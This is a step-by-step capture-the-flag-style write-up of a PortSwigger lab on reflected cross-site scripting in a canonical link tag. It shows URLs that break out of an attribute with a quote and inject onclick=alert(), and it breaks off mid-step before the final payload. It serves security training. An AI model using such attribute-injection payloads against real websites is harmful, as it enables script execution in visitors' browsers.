<h1 align="center"> Lab: Reflected XSS in canonical link tag </h1>

<img width="1000" height="665" alt="image" src="https://github.com/user-attachments/assets/d6ebe626-5c29-458f-8293-67cd0bb5fa17" />


## LAb URL: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag


## LAb Slutions
This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the `alert` function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations: 

````
ALT+SHIFT+X
CTRL+ALT+X
Alt+X
````
 Please note that the intended solution to this lab is only possible in Chrome. 




# Lab Solution:

<img width="1000" height="665" alt="image" src="https://github.com/user-attachments/assets/d6ebe626-5c29-458f-8293-67cd0bb5fa17" />

- Access Lab:
<img width="1176" height="956" alt="image" src="https://github.com/user-attachments/assets/8389e988-1ce5-492d-af68-f7a46647b75f" />

- After I want to injection something like, I add `helo` into URL:
````
https://0a7600da0372f2ae80b3f844003000da.web-security-academy.net/Helo
````
<img width="1227" height="413" alt="image" src="https://github.com/user-attachments/assets/5ae23d5b-9dd6-40e6-997d-b3614c7994a4" />

- But I see `Not found`:
<img width="980" height="233" alt="image" src="https://github.com/user-attachments/assets/0f11427c-0803-445b-84d3-b8d793ee1d35" />


- And then I add `?Helo`:
````
https://0a7600da0372f2ae80b3f844003000da.web-security-academy.net/?Helo
````
<img width="1233" height="400" alt="image" src="https://github.com/user-attachments/assets/423fe6d5-a883-4e66-936c-1b3bdd6dcfa5" />

- And we see nothing alert:
<img width="1224" height="1021" alt="image" src="https://github.com/user-attachments/assets/4d7c199a-8d2a-4128-8651-16ea9eeb2683" />

- After I want to view source -> `Right-Click` -> `View Page Source`:
<img width="1907" height="728" alt="image" src="https://github.com/user-attachments/assets/f6b783ef-77dd-4f33-b217-10f021523c97" />

- In this we see what we Inject, also we see it include `'`.

- After I add `'` to our URL:
````
https://0a7600da0372f2ae80b3f844003000da.web-security-academy.net/?'Helo
````
<img width="1010" height="198" alt="image" src="https://github.com/user-attachments/assets/9d8ef260-1d29-45e2-ac40-eeae8250655d" />

- But we still see nothing:
<img width="1232" height="883" alt="image" src="https://github.com/user-attachments/assets/8d508703-d60c-4678-8824-13b1408b2b4c" />

- After I go to `View Page Source` again:
<img width="1910" height="547" alt="image" src="https://github.com/user-attachments/assets/c25adc14-4d80-412c-92ed-822822756349" />

- And we see our what that we was Inject.


- After I add more `=a`:
````
view-source:https://0a7600da0372f2ae80b3f844003000da.web-security-academy.net/?%27Helo=a
````
<img width="1907" height="637" alt="image" src="https://github.com/user-attachments/assets/9dd8cd5d-1fe3-4622-ad96-251f01e08360" />

- Now we see it has different.

- After I try others Inject and add some `onclick=alert()`:
````
view-source:https://0a7600da0372f2ae80b3f844003000da.web-security-academy.net/?%27Helo=a%20onclick=alert()
````
<img width="1902" height="235" alt="image" src="https://github.com/user-attachments/assets/5023869a-996d-44ef-90ae-96bca4854880" />

- Now we see `a%20onclick=alert()'/` is the value of `Helo`>

- After I add `'`:
````
view-source:https://0a7600da0372f2ae80b3f844003000da.web-security-academy.net/?'Helo='a onclick=alert()
````
<img width="1019" height="112" alt="image" src="https://github.com/user-attachments/assets/c1a7427e-d51a-465a-aa13-a7358d8ec04d" />

- after i press enter:
````
view-source:https://0a7600da0372f2ae80b3f844003000da.web-security-academy.net/?%27Helo=%27a%20onclick=alert()
````
<img width="1918" height="441" alt="image" src="https://github.com/user-attachments/assets/2d4f99ff-eb42-40fb-8b8f-2e418a711f8f" />



- After I add other `'`























